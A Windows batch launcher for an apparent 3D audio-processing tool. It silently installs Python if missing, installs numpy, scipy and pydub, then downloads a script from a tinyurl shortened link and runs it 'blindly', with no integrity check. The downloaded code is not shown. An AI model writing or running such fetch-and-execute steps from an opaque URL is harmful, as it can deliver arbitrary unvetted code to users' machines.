@echo off
REM ========================================
REM Minimal 3D Audio Processing Launcher
REM Installs Python, downloads script, runs blindly
REM ========================================

setlocal

:: --- Detect Python ---
set PYTHON_EXE=
for %%P in (
    "%ProgramFiles%\Python312\python.exe"
    "%LocalAppData%\Programs\Python\Python312\python.exe"
    "%ProgramFiles%\Python311\python.exe"
    "%LocalAppData%\Programs\Python\Python311\python.exe"
) do (
    if exist "%%P" set PYTHON_EXE=%%P
)

:: --- Install Python if not found ---
IF "%PYTHON_EXE%"=="" (
    echo Python not found! Installing Python 3.12...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile 'python_installer.exe'"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe

    for %%P in (
        "%ProgramFiles%\Python312\python.exe"
        "%LocalAppData%\Programs\Python\Python312\python.exe"
    ) do (
        if exist "%%P" set PYTHON_EXE=%%P
    )

    IF "%PYTHON_EXE%"=="" (
        echo Python installation failed. Please install manually.
        pause
        exit /b 1
    )
    echo Python installed successfully.
)

:: --- Upgrade pip and install dependencies ---
"%PYTHON_EXE%" -m ensurepip
"%PYTHON_EXE%" -m pip install --upgrade pip numpy scipy pydub

:: --- Download Python script ---
set PY_SCRIPT=pa1112.py
IF NOT EXIST "%PY_SCRIPT%" (
    echo Downloading Python script...
    powershell -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/ARBYAUDIO2' -OutFile '%PY_SCRIPT%'"
    IF %ERRORLEVEL% NEQ 0 (
        echo Failed to download Python script.
        pause
        exit /b 1
    )
)

:: --- Run Python script ---
echo Running Python script...
"%PYTHON_EXE%" "%PY_SCRIPT%"

echo Done.
pause
